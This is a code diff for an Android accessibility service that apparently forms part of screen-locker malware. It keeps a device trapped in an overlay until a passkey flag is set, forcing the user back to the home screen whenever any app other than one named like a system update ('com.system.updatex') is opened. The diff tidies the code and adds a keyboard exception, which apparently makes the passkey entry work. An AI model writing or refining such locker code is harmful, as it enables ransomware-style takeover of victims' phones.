@@ -8,11 +8,8 @@ import android.view.accessibility.AccessibilityEvent;
 public class KioskAccessibilityService extends AccessibilityService {
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
-        // CHECK THE FLAG FIRST
         boolean isUnlocked = getSharedPreferences("fr4nx_state", MODE_PRIVATE)
                 .getBoolean("is_unlocked", false);
-        
-        // IF THE USER ENTERED THE PASSKEY, DO NOTHING
         if (isUnlocked) return;
 
         if (event == null || event.getEventType() != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) return;
@@ -28,11 +25,8 @@ public class KioskAccessibilityService extends AccessibilityService {
             performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK);
             performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
             Intent intent = new Intent(this, OverlayService.class);
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                startForegroundService(intent);
-            } else {
-                startService(intent);
-            }
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent);
+            else startService(intent);
             return;
         }
 
@@ -44,19 +38,17 @@ public class KioskAccessibilityService extends AccessibilityService {
             }
         }
 
-        // Trap User in the Overlay
+        // Trap User in the Overlay (BUT ALLOW KEYBOARD)
         boolean isAllowed = foregroundPackage.equals("com.system.updatex") 
                 || foregroundPackage.contains("launcher") 
-                || foregroundPackage.contains("systemui");
+                || foregroundPackage.contains("systemui")
+                || foregroundPackage.contains("inputmethod"); // <-- FIX: Allows the keyboard
 
         if (!isAllowed) {
             performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
             Intent intent = new Intent(this, OverlayService.class);
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                startForegroundService(intent);
-            } else {
-                startService(intent);
-            }
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent);
+            else startService(intent);
         }
     }
     @Override
